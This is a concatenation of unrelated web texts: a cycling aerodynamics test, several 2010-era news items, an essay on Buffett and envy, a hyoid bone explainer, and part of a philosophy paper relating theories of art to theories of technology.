Nice repeatable data that did make sense and gelled with his considerable testing experience .
The testing was done at yaw angles of 0 and 10 degrees in 48.3 km/h ( 30 mph ) wind , which was extrapolated back to 40 km / h .
Wind tunnel data
Setup Wind Tunnel 0 CdA ( m ^2 ) Speed ( km/h ) at 278W Power req ’d at 40 km / h ( W ) * Tarmac SL2 | road helmet | drop bars 0.3019 40.00 278.3 Tarmac SL2 | road helmet | clip - on aero bars 0.2662 41.65 248.9 Tarmac SL2 | TT2 helmet | clip - on aero bars 0.2547 42.25 239.5 Transition | road helmet | aero bars 0.2427 42.90 229.6 Transition | TT2 helmet | aero bars 0.2323 43.50 221.0
[* The power req ’d at 40 km / h is aero power only , hence it ’s significantly lower than the power measured out on the track .
On the other hand , the CdAs outdoors and in the wind tunnel are closely matched .
This is more what we ’re interested in . ]
The nice thing about this set of protocols is that there are two separate ways of comparing bikes and helmets .
The difference between the Specialized road helmet and the TT2 was 8.6W or 9.4W , depending on which set of protocols we chose .
The difference between the Specialized Tarmac SL2 with clip-ons and the Transition was 18.5W or 19.3W .
Finally , the difference between a road frame and one with a set of clip - ons on it was a whopping 29.4 watts .
This difference is due to rider position ( in the drops vs. in the aero bars ) .
That ’s 60 watts accounted for in savings .
The July tests showed 70 watts , but the wheels were also changed in that one so we can guesstimate that HED 3 Trispokes will save an extra 10 watts over Hed Bastogne wheels .
Since there were other differences ( wore a TT3 in July vs a TT2 this time , and a skinsuit vs road wheels ) we have to be careful in making this conclusion .
But if it is made , it also shows that the Roval wheels tested about the same as the trispokes and the Roval wheels saved about the same 10 watts the trispokes did .
Finally , to put it in perspective , we can list the wattage savings per unit cost .
Cost $ / watts saved at 40 km / h Clip - on bars $ 100 - 1200 $ 3.30 - $ 40 Aero helmet $ 75-230 $ 8.30 -25.50
Time trial bike $ 1000 - 10,000 +
$ 50 - 500 Aero wheels $ 600 - $ 8000 $ 60 - 800
How much is it worth ?
That ’s for you to decide .

The PLA is the largest army in the world
China has banned its 2.3 million soldiers from internet blogging , state media report .
A new regulation prohibits the People 's Liberation Army ( PLA ) from creating websites or blogs , citing confidentiality concerns , the official Xinhua news agency says .
China operates vast internet censorship , dubbed the " great firewall of China " .
Websites deemed sensitive by the government are routinely blocked .
" Soldiers cannot open blogs on the internet no matter ( whether ) he or she does it in the capacity of a soldier or not , " Xinhua quoted Wan Long , a political commissar of the PLA , as saying .
" The internet is complicated and we should guard against online traps " .
The directive , which went into effect on 15 June , also banned military employees from placing job - hunting or lonely hearts advertisements in the media .
As for the United Kingdom , we must be grateful that those frightfully clever Europhiles , such as Lord Mandelson and Kenneth Clarke , did not get their way .
Had they been able to scrap the pound and embrace the euro this country would be even closer to ruin .
Without a flexible currency , the colossal deficit clocked up by Mr Brown would have crushed us completely .
We have little to thank him for , but it would be churlish to deny that his decision to reject Tony Blair 's blandishments in favour of the euro was a life - saver .
The hyoid bone is a very special bone in the human head which is unique in that it is not attached to any other bones in the body ; rather , it is supported by a network of muscles and ligaments , which trap it like a fly in amber directly below the tongue .
The primary role of the bone is to support the weight of the tongue , allowing people to articulate words while speaking , and enabling the production of a wide range of vocalizations .
larynx and hyoid bone .
Without the hyoid bone , humans would be incapable of speech as we know it , so this bone represents a major step in human evolution .
The first hyoid bones appeared in hominids around 300,000 years ago , and they were accompanied by a phenomenon known as the larynx drop , which allows the larynx to settle deeper into the throat after childhood , further enabling speech .
Needless to say , we probably would n't exist in our current state without this bone , as speech is a crucial tool for civilization .
The hyoid bone supports the tongue .
This bone is shaped roughly like a horseshoe , and it nestles in the throat below the tongue .
This bone is also sometimes called the " lingual bone , " in a references to the fact that it gives humans the power of speech .
The term " hyoid " comes from the Greek hyoeides , which means " upsilon - shaped . "
The Greek letter upsilon is shaped much like the Roman letter U .
Speech plays an important role in building friendships and strengthening bonds .
When looking at the hyoid bone , it can be broken into several sections .
The main " body " is like the heavy base of the U , while the greater cornu are the horns which make up the arms of the U .
The lesser cornu are two smaller sections of the hyoid which create a second set of horns on the U , near the body of the hyoid bone .
In addition to being of interest to living humans , the bone is also sometimes important in forensic analysis .
When the hyoid bone is broken , it is a strong indicator that someone was strangled , as the bone is otherwise extremely difficult to break .
Therefore , forensic analysts often check on the condition of the hyoid in a suspicious death , especially in the event that only skeletal remains are available for autopsy , as a broken hyoid can seal the deal , as it were , providing evidence of a clear case of strangulation .
A new report from Greenpeace warns that the growth in cloud computing will be accompanied by a sharp rise in greenhouse gas emissions , and calls on big companies like Facebook , Yahoo and Google to do more to help the environment .
" The cloud is growing at a time when climate change and reducing emissions from energy use is of paramount concern , " Greenpeace says in the report released Tuesday .
" With the growth of the cloud , however , comes an increasing demand for energy . "
How much of an increase ?
Greenpeace admits that it's hard to calculate , but it estimates that the electricity consumed by the world 's data centers and telecommunications networks -- which it calls " the main components of cloud - based computing " -- will triple between 2007 and 2020 .
The big Internet companies are working hard to improve their energy - efficiency , which helps reduce their operating costs .
But Greenpeace argues that they will still choose to locate data centers where it makes the most business sense , even if that means using " dirty " power from coal - fired plants .
The report , titled " Make IT Green : Cloud Computing and its Contribution to Climate Change , " takes as its starting point the upcoming release of Apple 's iPad .
Greenpeace calls the iPad " a harbinger of things to come , " in the sense that its main purpose is to download video , music and books from cloud - based services .
It 's not the first time Greenpeace has called attention to energy use in data centers , and the environmental group seems keen to raise awareness among consumers about where their Internet services come from .
Greenpeace recently started a campaign against Facebook , over its decision to build a data center in Prineville , Oregon , that will derive its electricity mostly from coal - fired power stations .
In its report Tuesday , Greenpeace contrasted that decision with one made by Yahoo , which is building a data center outside Buffalo , New York , that will use mainly hydroelectric power .
Facebook has responded that Oregon 's climate will allow it to use a type of fresh - air cooling that removes the need for heavy cooling equipment .
It also says it never " chose " to run its data center on coal .
" The suggestions of ' choosing coal ' ignores the fact that there is no such thing as a coal - powered data center .
Similarly , there is no such thing as a hydroelectric - powered data center .
Every data center plugs into the grid offered by their utility or power provider , " Facebook told the Web site Data Center Knowledge last month .
Google and Microsoft , even while they continue to build new data centers , have done work to educate people about how to reduce their energy use .
Last year Google even proposed a US $ 3.7 trillion , 20 - year plan to reduce the U.S. 's dependency on fossil fuels .
Still , Greenpeace wants Internet companies to do more to shape the supply of renewable energy available to them , by increasing demand through choices about where they locate new data centers , or by lobbying politicians .
" Ultimately , if cloud providers want to provide a truly green and renewable cloud , they must use their power and influence to not only drive investments near renewable energy sources , but also become more involved in setting the policies that will drive more rapid deployment of renewable electricity generation economy - wide , and place greater R&D into storage devices that will deliver electricity from renewable sources 24/7 , " Greenpeace said .

Gary Coleman , the actor who as a child star of the television comedy “ Diff ’rent Strokes ” made “ What ’choo talkin ’ bout , Willis ? ” a catchphrase of the 1980s , has died .
He was 42 .
The death was reported by CBS News , citing the Utah Valley Regional Medical Center in Provo , where Mr. Coleman had been hospitalized after an injury .
A diminutive actor who stood at 4 feet eight inches , Mr. Coleman became a star at age 10 for his role on “ Diff ’rent Strokes . ”
The show , which had its debut in 1978 , cast him as Arnold Jackson , the younger of two children adopted by the millionaire Philip Drummond ( played by Conrad Bain ) .
The show ran for eight years on NBC and ABC .
In 1989 , Mr. Coleman sued his adopted parents for mismanaging the money he made on the show and won a settlement , but later filed for bankruptcy .
He continued to appear in brief film and television roles , often as himself , and often poking fun at his grownup struggles .

" Tea Party " favorite Sharron Angle meets today with Republican leaders and fundraisers here in Washington , a week after successfully taking on the party 's establishment for the right to take on Senate Majority Leader Harry Reid in November .
Reports in the Associated Press and Las Vegas Review - Journal say Angle will appear at today 's Senate Republican caucus lunch and sit down with various GOP leaders , including Sen .
John Cornyn , R - Texas , chairman of National Republican Senatorial Committee .
Reid , the Senate 's top Democrat , is one of the GOP 's top targets .
" She 'll be making the rounds of all the people she needs to see to get her general election campaign off to a good start , " Angle spokesman Larry Hart told the AP about the nominee 's multistop trip to Washington .
Angle , backed by anti-tax " Tea Party " activists , won the Republican Senate primary over former state party leader Sue Lowden , businessman Danny Tarkanian and others .
The non-partisan Cook Political Report rates the Nevada Senate race a toss up .
For Angle , a former state legislator , the meetings in the nation 's capital are important because she needs the national Republican establishment for help with fundraising and staffing , said University of Nevada - Las Vegas political science professor David Damore .
Reid held a significant money advantage as of May 19 , according to the non-partisan Center for Responsive Politics , and Damore said Angle 's staff during the primary was " basically her husband and one volunteer . "
In her home state , Angle has reputation for being a " thorn in the side " of Republicans , Damore said , and some Nevada leaders would prefer having Reid in office compared to a conservative newcomer .
A number of Republicans have thrown their support behind Reid , including Reno Mayor Bob Cashell .
This lack of support from Nevada GOP leaders , according to Damore , means Angle is " going to find a more receptive audience in Washington than she is here . "
Reid , by the way , is going to get some campaign help soon .
President Obama will travel to Nevada for a second time this year to boost the Democratic leader and pad his campaign coffers .

Die religiöse Bewegung der Scientology setzt auf ihre prominenten Mitglieder wie Tom Cruise eines ist .
Mit einer brisanten Enthüllung haben sie sich jetzt ins eigene Fleisch geschnitten .
Geheime Geständnisse von Tom Cruise sollen von Scientology - Chef David Miscavige heimlich aufgezeichnet worden sein und bei seinen privaten Dinnerpartys für Unterhaltung gesorgt haben .
Wie der ehemalige Top - Scientologe und Aussteiger Mark Rathbun auf seinem Blog enthüllt , hat Miscavige massive Vertrauensbrüche an seinem populärsten Mitglied begangen .
Das Oberhaupt der Scientology - Kirche habe veranlasst , dass die sogenannten " Auditing - Sitzungen " , eine Art der Beichte , von Schauspieler Tom Cruise ohne dessen Wissen aufgezeichnet wurden .
In diesen Gesprächen müssen Scientology - Mitglieder über ihre intimsten Geheimnisse erzählen , um so von Psychosen geheilt zu werden .
Zu Tisch beim " selbst ernannten Diktator "
Mark Rathbun selbst , so behauptet er , hatte Cruise in dessen Einstiegszeit im Jahr 2001 in solchen Sitzungen verhört und dessen Aussagen mittels Videokamera und Aufnahmegerät mitgeschnitten .
Er habe dann , wie von Miscavige befohlen , Transkripte der Sessions angefertigt und diese seinem Boss – den er mittlerweile als " selbst ernannten Diktator " beschreibt - übergeben , so Rathbun .
David Miscavige soll sich dann bei privaten Treffen mit Freunden über die Geständnisse von Cruise lustig gemacht haben .
Eine bittere Pille für Tom Cruise , hat er doch stets öffentlich für die Sekte geworben und dafür böse Kritik kassiert .
Nebenbar war David Miscavige auch Trauzeuge bei seiner Hochzeit mit Katie Holmes im Jahr 2006 .
Die Promi-Clique der " Church of Scientology "
Scientology ist eine neue religiöse Bewegung , die in Europa immer wieder für Diskussionen sorgt .
Während sie in Deutschland vom Verfassungsschutz überwacht und in Frankreich von einer Zwangsauflösung bedroht wird , ist sie in den USA nach jahrelangen Rechtsstreitigkeiten mittlerweile sogar als steuerbefreite Religionsgemeinschaft anerkannt .
Prominente sind ein wichtiges Aushängeschild der Organisation .
Berühmte Mitglieder der " Church of Scientology " sind neben Tom Cruise und seiner Ehefrau Katie Holmes auch John Travolta , Nicole Kidman , Jennifer Lopez und Gatte Marc Anthony , Jenna Elfman , Kirstie Alley und Priscilla Presley .

Texas GOP Unveils Brand New , Far - Right Platform
Created : June 25 , 2010 16:46 | Last updated : July 31 , 2020 00:00
The Texas Republican Party unveiled its new platform today and it contains some very far - right provisions , to say the least .
Media Matters has the full details , but here are some of the more noteworthy measures :
** We oppose the legalization of sodomy .
** We demand that Congress exercise its authority granted by the U.S. Constitution to withhold jurisdiction from the federal courts from cases involving sodomy .
Further , we urge Congress to ** withhold Supreme Court jurisdiction in cases involving abortion , religious freedom , and the Bill of Rights .**
We believe Congress should ** repeal the Federal Reserve Act of 1913 .**
We strongly believe that the United States of America must protect and defend its national sovereignty as given in the Constitution to the people and remain free of external control or influence and be governed independently of any foreign power , especially with regard to the formation of the North American Union / Community as proposed by the Council of Foreign Relations ( CFR ) .
We call upon the President , Senators and Representatives to defend our national sovereignty in accordance with their oaths of office .
Our policy [ on Israel ] is ** based on God ’s biblical promise to bless those who bless Israel and curse those who curse Israel ** and we further invite other nations and organizations to enjoy the benefits of that promise .
We oppose a one - world government in direct opposition to our basic principles and eroding our sovereignty .**
We oppose the implementation of one world currency .**
We demand Congress ** stop funding the IMF and any other international financing agencies .**
We believe it is in the best interest of the citizens of the United States that we immediately rescind our membership in , as well as all financial and military contributions to , the United Nations .
By most standards , the Texas wing of the Republican Party is on the far - right of the spectrum , and as far as the far - right goes , there is n’t anything new in this document ; homophobia , xenophobia , opposition to international cooperation and fear of a “ North American Union ” are long - standing preoccupations .
If there ’s anything interesting about the Texas GOP ’s platform is that it is one of the clearest examples of the Republican Party ’s capture by right - wing extremists .
It ’s not just the conservative base either ; Republican Senate candidates like Nevada ’s Sharron Angle and Kentucky ’s Rand Paul have clear and abiding ties to the far - right , and congressional Republicans regularly espouse radical views that would have been anathema to nearly everyone a few years ago .
Berkshire Hathaway held their annual bash in Omaha a few weeks ago , as delightfully reported by Laura Rittenhouse .
As happens at that time of year , Buffet and his even - more - quotable - if - that ’s - possible partner in investing , Charlie Munger , make themselves available to be interviewed .
Which is where I first heard their rundown of the seven deadly sins .
Buffet :
As an investor , you get something out of all the deadly sins — except for envy .
Being envious of someone else is pretty stupid .
Wishing them badly , or wishing you did as well as they did — all it does is ruin your day .
Does n’t hurt them at all , and there ’s zero upside to it .
If you ’re going to pick a sin , go with something like lust or gluttony .
That way at least you ’ll have something to remember the weekend for .
This is n’t just good homespun Buffet humor .
It ’s deeply meaningful on at least three levels .
Why Envy Is Bad For Your Investments
First of all , you can make a case that envy actually destroys your investment portfolio .
Turns out Buffet and Munger have used this standup routine before , and it was brilliantly detailed five years ago in a blogpost by Sanjay Bakshi .
Basically , if you ’re really knowledgeable about a business in which you can get a 19 % return , but have heard about some other business in which you can get a 21 % return , you ’d be stupid to forsake the 19 % .
Which is why good investors say things like “ stick with what you know . ”
( Buffet himself goes into more detail in his Chairman ’s letter of 1993 , in the section on equity investments , even quoting Mae West ) .
Envy , in other words , can hurt you financially .
Why Envy is Bad for Your Relationships
Buffet aside , envy and its kissing cousin resentment are equally culpable in the softer realm .
Like customer relationships .
Here ’s why .
If you ’re envious of a customer — of anyone , really –it poisons your relationships with that person .
What are you envious of ?
Their money ?
Their status ?
Their social ease ?
Their romantic partner ?
Regardless of the object of your envy , your level of envy is likely to be most acute when you ’re with the envied person — and particularly if the money , status , social ease or romantic partner are in play or close at hand .
In those cases , our envy oozes out of us in the most dishonest ways .
We sneak furtive glances , make snide comments , look for favor , disparage the things we covet , and subtlely beg .
All the while , of course , maintaining plausible deniability about what we are doing .
Or so we think .
In fact , we kid only ourselves .
The customer may not follow every twisted inward thought we have ( why would they want to ? ) but they know the result .
We are absent ; we are not genuinely focused on them ; we are obsessed by our own needs , and cannot focus on theirs .
Envy can hurt your commercial relationships .
Why Envy is Bad for Your Own Self
As if it were n’t enough that envy hurts us financially and commercially , it rots us as people too .
Envy , festering , becomes resentment .
The Latinate derivation of resentment is re-feeling .
Feeling after the fact , revisiting the past , dwelling negatively on history — the one thing over which we have precisely no control .
Resentment is akin to playing God , groveling in the fiction that we can alter the reality of time past .
It ’s no accident that the 12 - step program literature refers to resentment as “ a grave matter , ” and “ the number one offender . ”
Living in resentment means you are living outside reality .
Living in a fictional world between your ears just removes you from humanity , and from the moment .
Alone and out of time is no good way for a human being to live .
It all starts with envy .
Buffet was right .
Go get you some good sins , if you must , at least there ’s some pleasure in them .
As to envy — as Buffet put it , there ’s no upside to it .

Towards an Understanding of Technology Through Theories of Art PDF )
Carl M. Johnson
Contents :
​ Introduction
It is commonplace even today for the question “ What is art ? ” to prompt the public to engage in a spirited debate . †
Interestingly , however , there is no similar tradition for the public to engage with the question of “ What is technology ? ”
The question of what technology is seems to be too obvious or inconsequential to devote much intellectual energy to it .
The closest question to it which does generate public enthusiasm is “ Is this discipline a science ? ”
In spite of this , in this paper I want to show that our understanding of what technology is can be refined by contrasting our many existing theories of art with various possible theories of technology .
For the English speaking public , linking the question of art with technology seems absurd , since the prerogatives of art and technology appear to be diametrically opposed .
Looked at etymologically , however , this reaction is surprising , since the word “ art ” comes from the Latin ars , which was used as a translation of the Greek technē , which give birth to the English “ technology . ”
Of course , it is not so unusual in the history of languages for words with a common origin to come apart in meaning or even to become opposed to one another .
What is surprising in the case of “ art ” and “ technology ” is that this separation has happened in spite of the difficulty we find when tasked with clearly differentiating the sphere of technology from the sphere of art .
Both are human inventions done partly for human benefit and partly for their own sakes .
Both separate us from non -human animals and from nature .
Both have been considered the crowning achievement of civilizations .
As a result , it is valuable to ask whether this separation of meanings has come about through a refinement of our understanding and discriminative abilities or through the imposition of a false dichotomy .
To better understand the question of what technology is I will look at broad categories of theories of art and ask whether we might understand technology under parallel concepts .
To bring order to what might be a nearly endless task , I will begin by classifying theories of art according to which cause from Aristotle ’s theory of four causes the theory takes to be primary in creating art : efficient , formal , material , or final .
Efficient theories are those that focus their explanations on the processes that give rise to art rather than art objects themselves ; formal theories try to characterize what different art objects have in common ; material theories look at the art object itself ; and final theories are those that focus on the purpose of art or lack thereof .
Once I have looked at art theories according to these classifications , I will utilize the additional category of the “ place ” of art to better characterize remaining possible theories .
Within each of these categories , I will also consider what a parallel theory of technology would look like .
Finally , I will conclude by noting the inadequacy of any theory with just a single focus to capture all of our intuitions about art or technology and recommend that instead we create a robust theory that incorporates elements of each potential causal foci into a larger normative vision for the world as a whole .
​ Efficient Cause
It has often been noticed that out of Aristotle ’s four causes , efficient causation is all that is meant today when we speak of “ causation ” in general .
David Hume is notorious in this regard for introducing the image of the colliding billiard ball as the paradigm of a causal interaction .
Within theories of art , the theories that we may classify as focusing on efficient causation are those that focus on explaining how art is made rather than focusing on describing art objects .
For these theories what is determinative of an object ’s status as a work of art is the process by which it has come to be .
For example , an efficient theory of art may emphasize that works of art are created as matter of painstaking attention by the artist .
On this basis , purported artworks which are created in a slapdash manner may be eliminated from consideration as possible art objects .
This leads to the common objection to certain purported artworks that “ my child could have done that . ”
In other words , the degree to which an object is artistic is related in certain ways to the level of skill necessary to create the object .
On the other hand , some theories of art focus on the importance of “ spontaneity ” over mere skill .
Such theories describe skill as a quality of the craftsman rather than the artist proper .
Related theories of art hold that it is the process of “ expression ” that makes an act an artistic act .
On this set of theories , an artwork is the result of a process by which an artist expresses him - or herself through the art .
This set of theories eliminates banal but meticulously crafted objects from consideration as art objects on the grounds that such purported artworks fail to express any aspect of the inner life of the artist .
Similarly , overtly commercial objects are viewed with suspicion .
A focus on how an artwork comes to be leads naturally to a consideration of who it is that creates the artwork ( the subjective turn ) .
One seemingly tautologous way of speaking about art is to say that “ Art is what artists make . ”
From that logical starting point , one might suppose that the qualities of the artist are what make some objects works of art and others not .
Although logically speaking one might just as easily suppose the reverse — that is the properties of the art that makes the artist — nevertheless , this is a way of thinking about art with broad popular reception that is reinforced through the stereotype of the starving artist as a tortured genius .
Hence another set of art theories focus on the artist as the locus of art .
These theories combine well with the earlier two theories by supposing that an artist is a person with great skill who desires to express him - or herself spontaneously in art and avoids commercial entanglements .
The apotheosis of the efficient cause theory of art must be the famous urinal of Marcel Duchamp ( or “ R. Mutt ” ) .
The object itself , like his other readymades , has no claim to being art except that it was produced by Duchamp who , as an artist , is qualified to turn ordinary objects into artworks merely by deeming them artworks .
For Duchamp , the primordial artistic act is submitting an object to a gallery for inclusion .
( The role of the gallery will be explored in greater depth in the section on “ place . ” )
The theory underlying Duchamp ’s practice has been the subject of much discussion but whatever it is , we can say that in general it holds that there are very few properties that an individual is required to possess in order to qualify as an artist .
In fact , it might be that to be an artist one needs only to declare oneself to be an artist .
Or perhaps the artist is an individual recognized as such by other artists .
( The “ Artworld ” theory will also be explored in greater depth later . )
Applying this set of overlapping and conflicting theories to the question of what technology is , we see a vision of technology as that which is produced by the thorough and skillful application of the scientific method .
On this view , defining technology means defining the scientific method that produces it .
Alternatively , technology might be a mode of expressing our understanding of physical laws in a practical medium .
In this case , theories of technology ought to focus on describing flashes of insight or the “ eureka ” moment .
Or perhaps technology is that which created by the engineer or the inventor .
As with art , here also we have stereotypes of the “ mad scientist ” or otherwise tortured ( scientific ) genius . †
Theories of technology of this type will list the character traits needed to produce technology , perhaps focusing on meticulousness and persistence along with vision and intellect .
One common flaw for theories of both art and technology that focus on the efficient cause as a defining aspect is that the processes involved in the creation of art and technology have many side - effects which do not count as artworks or technological inventions .
It may be that the artist creates an artwork through sweat and tears , but the sweat and tears are not themselves artworks .
Neither is a great artist creating art when in the restroom .
By the same token , the application of scientific study of the world may create pollution , which , while a technological by - product or artifact , is not a technological work in itself .
In order to distinguish things that the artist makes which are art from those that are not , we must look at the artwork .
So too , to tell technology from side - effects , we must look at the object manufactured .
When we look at the object , what we will see first are its formal qualities .
​ Formal Cause
Theories of art that look at the formal characteristics of the work have a long and venerable tradition .
They tend to be at their height when there is a strong tradition of criticism within a culture .
Around the world , whenever a field of art becomes sufficiently mature , artists and critics will begin creating elaborate theories to explain just what qualities a superior work has to separate it from an inferior work .
For this reason , there are innumerable different and frequently conflicting formal theories of art .
For example , many of the mid-twentieth century art movements in America were centered around the theory that a good painting is a painting in which certain formal qualities were balanced in a particular way .
For this reason , the critic Clement Greenberg praised the work of Jackson Pollock , since it invited the viewer to just look at the canvas without interpolating any interpretations of the meaning of the work .
The formal qualities of the work were felt to stand or fall on their own merits apart from the life of the painter or the meaning of the work .
In spite of the narrow meaning of “ formalism ” within art theory , we might also classify theories of art that focus on shared properties and patterns common to superior works of art as formal cause theories .
Thus , theories about the proper contents for artworks are “ formal ” theories in this broader sense of “ formal . ”
For example , it was a widely held opinion in French salons early in the nineteenth century that paintings or sculptures which deal with mythological or historical events are more artistically valuable than those that deal with still life or landscapes , but over the course of the century , this opinion was reversed .
By the mid-twentieth century , it was widely felt by elite critics that the best content for a painting was no content ; abstract painting was considered superior to representational painting .
This shifting of opinions can be seen as a process in which new formal theories replace old ones .
Whatever particular kind of content it is that critics favor at a given time , the fact they are classifying things as more or less artistic according to the similarity of the works to some ideal means that all of these theories are focused on the formal causation of the work .
Looking at technology , there are many potential ideals from which to take a description of its form , but perhaps the most important is the “ machine . ”
Something technological ought to be distinctly inorganic , metallic , angular , hard , and powerful like a factory machine .
A technology theorist might emphasize that a technological artifact is something made within certain engineering tolerances with certain pieces fixed and certain pieces allowed to move in specified channels .
On the other hand , a broader view of technology would allow for the existence of “ social technology . ”
Such a view might emphasize not only the inorganic but also the ways that human beings are able to shape whole ecosystems .
One example is the Native Americans of the Pacific coast , who skillfully used forest fires to control their environment .
A more contemporary example might be the factory farm , in which the vicissitudes of nature are regularized by human ingenuity ( although not without creating new problems ) .
What these examples show is an imposition of regularity on the irregular rather than any superficial aspect .
Nevertheless , they constitute a formal explanation of technology .
Whichever specific formal theory one favors for art or technology , it is clear that existence of such a vast range of theories casts doubt on the viability any particular one .
Such theories are transparently subject to the passing whims of history and clearly enshrine the tastes of their creators .
When painters paint colorful canvases , the critics praise vividness ; when painters paint subdued canvases , the critics praise restraint .
In one age the paradigmatic technological artifact is the spear ; in the next , the compass ; in the next , the clock ; in the next , the engine ; in the next , the computer .
Each theory has too specific of a vision of what a proper form is to be very lasting .
At the same time , as we shall see , these theories fall short by neglecting the particularity of the object .
To make a more particular theory , we must focus on the material cause , and to make a more general theory , we must focus on the final cause .
​ Material Cause
Perhaps the simplest theory of art is to hold that what makes a thing art is the material from which the work is made .
Paint on canvas is a painting , and therefore art .
Marble when hewn makes sculptures .
Paper when marked is a drawing .
Though such theories of art are too naïve to have many adherents , it is not so unusual to run across particular technologists from the twentieth century proclaiming that some certain material , possible steel or glass , is the technological material par excellence .
Traditionally archeologists have divided up the earliest phases of humankind ’s existence according to the dominant material used for tools : the Bronze Age , the Iron Age , etc .
Unfortunately , well recognized forms of art have no particular material associated with them .
For example , theater can be reasonably well accommodated by an efficient theory or a formal theory , but there is no clear material by which it can be incorporated into a “ material ” theory of art for this sense of the word material .
Furthermore , although these theories focus on the kinds of materials needed for art or technology , these “ material ” theories are actually “ formal ” theories in disguise , in that they focus on the form that the materials ought to take rather than the material itself .
Unless a theory is focused on what the materials are in themselves , it can not be called a truly material theory .
Once all outward aspects of the object are taken away , what is left for a truly material theory of art to focus on ?
One answer might be the way that art objects are often invested with a kind of “ aura ” or historicity that cannot be captured formally or efficiently .
For example , a perfect copy of a Van Gogh painting that is formally identical to the original would not have the same economic value as an original Van Gogh .
Furthermore , many art theorists will insist that it also properly lacks the same artistic value as the original .
There is something about the material of the original art object that gets invested with a value that no copy can ever possess , no matter how exactly it duplicates the outer form of the original .
One might try to explain this value in terms of the efficient cause of the work .
It might be suggested that the difference between the two lies in the fact that the original was created in an act of expression , whereas the copy was created for merely base commercial reasons .
However , such a theory will be unable to explain why another person who happened to have the same character and experiences as Van Gogh would not be able to spontaneously create paintings of identical artistic value . †
Even an identical process of efficient causation cannot give a new art object the same underlying materiality as a prior work .
A purely material theory of art is impossible , because it would not be a theory at all , just an assertion that some things are art .
It would be an ontology that asserts the existence of art beings without giving an epistemology of art images .
However a hybrid theory with a strong emphasis on the material aspect of art could be made that would focus on the haecceity of a work or event .
Each work has a particularity all its own , which no other work possesses .
Certain objects have a kind of artistic sacredness because of their historicity .
Even non-material arts can claim such haecceity , as seen in the Japanese tea master Sen no Rikyū ’s concept of ichi - go ichi-e 一期一会 or “ one time , one meeting . ”
According to Sen no Rikyū , each particular performance of the tea ceremony has a specificity that will never arise again and must be appreciated in and for itself alone .
Material cause focused theories of art would hold that art has an attentiveness to the suchness of experience .
A corresponding theory of technology would hold that technology is a means of grasping things as they truly are — scientifically .
Technology makes us aware of the table as a collection of fundamental particles .
Technology tells us in greater and greater detail what a thing is and smashes our comfortable preconception of an anthropocentric world .
Through technological understanding we see things in their utter foreignness to human concern .
Alternatively , technology can be seen as erasing the “ aura ” of the individual material that art embraces .
As Martin Heidegger explains in “ The Question Concerning Technology , ” † technology is a mode of revealing , and what modern technology is most concerned to reveal in its challenging of things is the “ standing - reserve . ”
In this way , a lump of coal or the water of the Rhine River are not presenced to us as things in their unique individuality but as purely instrumental reserves of energy .
In this way , technology helps to destroy the individuality of any one thing as we classify it by its instrumental value .
One lump of coal is as good as any other .
One kilowatt of electricity is of the same value as another , no matter what its source .
Each electron is the same as any other electron with its only difference quantifiable in a handful of “ quantum numbers . ”
Unlike art , modern technology embraces instrumentality to such a degree that anything that can achieve the same end is the same thing .
We can skip over the individual objects and grasp all objects by the formal properties that bear on their instrumental value .
This way of thinking begins to give us one way of marking a distinction between art and technology , namely art ’s unique attention to the particularity of things .
On the other hand , when the art world embraces economic value as the sole measure of worth , it too overlooks things themselves as material entities and sees them as instrumentally useful only as “ standing - reserves . ”
The work of post - modernist artists who embrace capitalistic commodification ( such as Takashi Murkami and Damien Hirst ) would then show that the difference noted here is not a difference between art and technology but between pre-capitalist sentimentality and post - capitalist economic realism .
Such theorists might concede that to a certain extent , artists have been slower than technologists to embrace this change , but it is a difference of timing , not essence , so once again the line between art and technology becomes blurred .
Theories relating art and technology to the material underlying objects are interesting , but as mentioned , there cannot be complete theories of art and technology which focus solely on the material .
Such theories inevitably gain their generality by speaking about the purpose of art or technology as being awareness of materiality , but of course “ purpose ” is another name for Aristotle ’s final causation .
Accordingly , we are drawn into a consideration of alternative theories of the purposes of art and technology aside from merely bringing our attention to material itself .
​ Final Cause
The purpose of art is a topic that has been debated as extensively as the topic of what art is .
Indeed , there is widespread disagreement about whether art can or should have a purpose or not .
Nevertheless , I will take as final theories of art any theory of art which defines in art in relation to its purpose or lack thereof .
One common theory of the purpose of art is that art is for moral instruction .
In the strong form of this theory , all art is didactic ; it is only that sometimes the artists do not know how their art is instructing others .
In a weaker form , good art is art that allows for the proper instruction of others , neutral art is that which has no effect , and bad art is that which leads to corruption .
Although this family of theories may seem quite vulgar to aesthetes , it finds backing from such well - respected sources as Leo Tolstoy and Plato .
Tolstoy in What is Art? explains that the activity of art is based on the “ capacity of man to receive another man ’s expression of feeling and experience those feelings himself ” ( 5.5 ) and that as a result “ The stronger the infection [ of feeling and experience in the audience ] , the better is the art as art ” ( 15.29 ) . †
Plato in the early books of the Republic has Socrates discuss music and poetry solely as it relates to the education of the auxiliaries and guardians and seems to take this as their purpose .
One possible alternative purpose for art can be seen in the tenth book of the Republic when poetry is banned for its overly broad mimesis of things the poet does not know .
Many in the public seem to take mimesis of visual experience to be the defining quality of visual art , and they seem positively offended by the nineteenth and twentieth century trends away from mimesis and towards expression and abstraction .
Although mimesis is somewhat mystifying as a purpose for art ( why should I want a perfect visual copy of a table rather than a real table that I can use ? ) , it can not be denied that art is often utilized for its mimetic abilities and ranked according to its fidelity of mimesis .
Similar to theories of simple mimesis are theories of refined mimesis and theories of catharsis .
In these theories , the purpose of art is not simply to double the world like a mirror but to bring out its most salient aspects for their contemplation by an audience .
The audience is , as in didactic art , brought to greater understanding of life and their place in the world by engaging with art that takes the chaos of raw experience and transforms it into something aesthetically appreciable .
Or if this is not the effect on the audience , then at the very least art can serve as a kind of therapy for the artist and help the artist to express something that otherwise could not be expressed in words and so would trouble him or her deeply .
Related theories that focus on the artist ’s relationship to his or her audience concentrate on the purported difference between a mere craftsman and a true artist or genius .
A craftsman is able to realize objects that fulfill a certain formal vision for what beautiful objects ought to be , but a true genius is able to create new formal visions for what beauty is through their production of new objects .
The purpose of real art , on this view , is to bring new concepts into our consideration , so that we may have a richer experience of and appreciation for the world around us .
Other theories about the purpose of art place less emphasis on the fact that art allows for the aesthetic re-appreciation of the world than the aesthetic experience itself .
These theories are closely connected to theories of “ art for art ’s sake . ”
Aesthetic experience is taken to be different from a mere pleasure but nevertheless good for its own sake without any need for further instrumental value .
( A distinction between aesthetic experience and mere pleasure must be made so that one can have an aesthetic experience “ disinterestedly , ” that is , without concern for how the objects of such experience may be utilized instrumentally for obtaining pleasure . )
The appreciation for the world gained by aesthetic experience may or may not lead to any difference in one ’s behavior or activity in the world , but the experience itself is nevertheless of value .
